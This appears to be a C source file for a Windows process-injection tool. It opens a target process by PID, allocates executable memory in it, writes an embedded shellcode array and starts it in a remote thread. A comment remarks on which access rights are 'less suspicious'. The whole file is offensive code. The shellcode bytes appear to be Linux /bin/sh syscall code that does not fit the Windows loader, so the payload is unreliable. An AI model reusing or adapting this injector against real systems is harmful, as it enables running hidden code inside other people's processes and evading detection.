#include <windows.h>
#include <stdio.h>

// Status symbols
const char *k = "[+]";
const char *i = "[*]";
const char *e = "[-]";

/* could be done with macros like:
 #define k "[+]"
 #define i "[*]"
 #define e "[-]"

 or:

 #define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__)
 #define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__)
 #define error(msg, ...) printf("[-] " msg "\n", ##__VA_ARGS__)

but I prefer to use const char* because it's more readable
*/

// We want to supply a PID to the program to inject the shellcode into (target process)
DWORD PID, TID = NULL;

HANDLE hProcess, hThread = NULL; // handle to the target process and thread

LPVOID rBuffer = NULL; // remote buffer in the target process

// Shellcode to inject
unsigned char shellcode[] = {
    0x48, 0x31, 0xc9, 0x48, 0x81, 0xe9, 0xf6, 0xff, 0xff, 0xff, 0x48, 0x8d,
    0x05, 0xef, 0xff, 0xff, 0xff, 0x48, 0xbb, 0x2f, 0x62, 0x69, 0x6e, 0x2f,
    0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x48, 0x89, 0xe2, 0x57,
    0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05, 0x90, 0x90, 0x90, 0x90};

int main(int argc, char *argv[])
{

    if (argc < 2)
    {
        printf("%s Usage: %s <PID>\n", e, argv[0]);
        return EXIT_FAILURE;
    }

    PID = atoi(argv[1]); // convert the PID to an integer
    /* This is becouse the argument has a structure like this:
        argv[0] = "shellcodeInjection.exe"
        argv[1] = "1234" (PID)
    */
    printf("%s trying to inject shellcode into PID: %d\n", i, PID);

    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID); // open the target process with all access rights, normally you would use PROCESS_VM_WRITE and PROCESS_VM_OPERATION, becouse we only need to write and execute in the target process and it is less suspicious

    if (hProcess == NULL)
    {
        printf("%s failed to open the target process (%ld) error code: %ld\n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the target proces \n\\---0x%p\n", k, hProcess);

    // Allocate memory in the target process for the shellcode
    rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    printf("%s allocated %zu-bytes with PAGE_EXECUTE_READWRITE access rights in the target process", k, sizeof(shellcode));

    // Write the shellcode to the allocated memory
    if (WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), NULL) == 0)
    {
        printf("%s failed to write the shellcode to the target process (%ld) error code: %ld\n", e, PID, GetLastError());
        return EXIT_FAILURE;
    }
    else
    {
        printf("%s wrote the shellcode to the target process\n", k);
    }

    // Create a thread in the target process to execute the shellcode
    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)rBuffer, NULL, 0, 0, &TID);
    if (hThread == NULL)
    {
        printf("%s failed to create a thread in the target process (%ld) error code: %ld\n", e, PID, GetLastError());
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    printf("%s got a handle to the thread in the target process\n\\---0x%p\n", k, hThread);

    printf("%s waiting for the thread to finish\n", i);
    WaitForSingleObject(hThread, INFINITE); // wait for the thread to finish

    printf("%s cleaning up\n", i);
    CloseHandle(hProcess);
    CloseHandle(hThread);
    printf("%s finished\n", k);

    return EXIT_SUCCESS;
}